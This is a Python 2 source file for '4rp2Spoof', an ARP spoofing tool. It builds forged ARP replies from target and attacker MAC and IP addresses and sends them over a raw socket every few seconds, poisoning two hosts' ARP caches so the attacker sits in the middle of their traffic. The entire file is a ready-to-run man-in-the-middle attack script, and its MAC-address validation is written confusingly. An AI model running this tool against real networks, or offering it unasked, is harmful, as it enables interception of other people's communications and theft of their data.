#!/usr/bin/env python

# 4rp2Spoof v1.0 ARP Spoof Tool
# Coded by Jacob Holcomb/Gimppy
# March 2013

import socket, struct, signal, binascii, sys
from time import sleep


class Inject:

	def __init__(self):
	
		pass
		
	
	def sigHandle(self, signum, frm): # Signal handler
	
		print "\n[!!!] Ceasing Layer 2 ARP Injection. [!!!]\n"
		sys.exit(0)
		sleep(1)
			       

	def RawSock(self):

		try:
			#PF_Packet = packet interface. htons() tells the kernel what protocol we want.
			rawSock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)) #/usr/include/linux/if_ether.h
			print "\n[*] Created socket for 802.3 Ethernet Packet.\n[*] Using Ethernet Protocol ID 0x0800 - Internet Protocol"
			return rawSock
			
		except:
			print "\n[!!!] There was an error creating the socket object [!!!]\n"	
			
			
	def targets(self):

		while True:
	
			try:
				Targ1Addr3 = socket.inet_aton(raw_input("\n[*] Please enter the IPv4 address of target 1:\n>"))
				Targ2Addr3 = socket.inet_aton(raw_input("\n[*] Please enter the IPv4 address of target 2:\n>"))
				break

			except(socket.error):
				print "\n[!!!] Error: Please enter valid IPv4 addresses. [!!!]"
				sleep(1)
				
		iface = raw_input("\n[*] Please enter the name of the injection interface. Ex. eth0.\n>")		
				
		while True:
				
			try:	
				AttackMac = binascii.unhexlify(raw_input("\n[*] Please enter the Layer 2 Mac address of your injection interface. Ex: FFFFFFFFFFFF.\n>"))
				Targ1Addr2 = binascii.unhexlify(raw_input("\n[*] Please enter the Layer 2 Mac address of target 1. Ex: FFFFFFFFFFFF.\n>"))
				Targ2Addr2 = binascii.unhexlify(raw_input("\n[*] Please enter the Layer 2 Mac address of target 2. Ex: FFFFFFFFFFFF.\n>"))
				if len(AttackMac) != 12 or len(Targ1Addr2) != 12 or len(Targ2Addr2) != 12: #Checking to see if layer 2 addresses are 6 bytes
					break
				else:
					raise Exception
				
			except(TypeError):
				print "\n[!!!] Error: Please enter valid Layer 2 addresses. [!!!]"
				sleep(1) 		
			
		return Targ1Addr3, Targ2Addr3, Targ1Addr2, Targ2Addr2, AttackMac, iface		
			
	
	def PktInj(self, rawSock, Targ1Addr3, Targ1Addr2, Targ2Addr3, Targ2Addr2, AttackMac, iface):
	
		rawSock = rawSock
		HwType = "\x00\x01" # Ethernet
		ethProtoType = "\x08\x06" # ARP
		HwSize = "\x06"
		arpProtoType = "\x08\x00" # IPv4
		protoSize = "\x04"
		arpOpcodeReq = "\x00\x01" #Request
		arpOpcodeRep = "\x00\x02" #Reply
		Padding = "\x00" * 18 # Packet Padding
		count = 0

		try:
			print "[*] Constructing ARP packets for injection."
			Targ1EthHdr = struct.pack(">6s6s2s", Targ2Addr2, AttackMac, ethProtoType)
			Targ1ARP = struct.pack(">2s2s1s1s2s6s4s6s4s", HwType, arpProtoType, HwSize, protoSize, arpOpcodeRep, AttackMac, Targ1Addr3, Targ2Addr2, Targ2Addr3)
			Targ2EthHdr = struct.pack(">6s6s2s", Targ1Addr2, AttackMac, ethProtoType)
			Targ2ARP = struct.pack(">2s2s1s1s2s6s4s6s4s", HwType, arpProtoType, HwSize, protoSize, arpOpcodeRep, AttackMac, Targ2Addr3, Targ1Addr2, Targ1Addr3)
			TargPkt1 = Targ1EthHdr + Targ1ARP + Padding
			TargPkt2 = Targ2EthHdr + Targ2ARP + Padding
			
		except:
			print "\n[!!!] There was an error creating the ARP packets [!!!]\n"
			sleep(1)	
		
		try:
			print "[*] Binding socket object to interface %s." % iface
			rawSock.bind((iface, socket.htons(0x0800)))
			print "[*] Injecting spoofed ARP packets into network on interface %s.\n" % iface
			while True: 
				rawSock.send(TargPkt1)
				rawSock.send(TargPkt2)
				count += 2
				print "[*] Number of injected packets: %d." % count
				sleep(2.5) #Send packets every 2.5 seconds
		
		except:
			print "\n[!!!] There was an error binding the socket object to interface %s and sending spoofed packets [!!!]\n" % iface
			sleep(1)
			
			
def main():

	Spoof = Inject()
	signal.signal(signal.SIGINT, Spoof.sigHandle) #Setting signal handler for ctrl + c
	Targ1Addr3, Targ2Addr3, Targ1Addr2, Targ2Addr2, AttackMac, iface = Spoof.targets()
	rawSock = Spoof.RawSock()
	Spoof.PktInj(rawSock, Targ1Addr3, Targ1Addr2, Targ2Addr3, Targ2Addr2, AttackMac, iface)	
			
#Top-level script environment

if __name__ == "__main__":

    main()
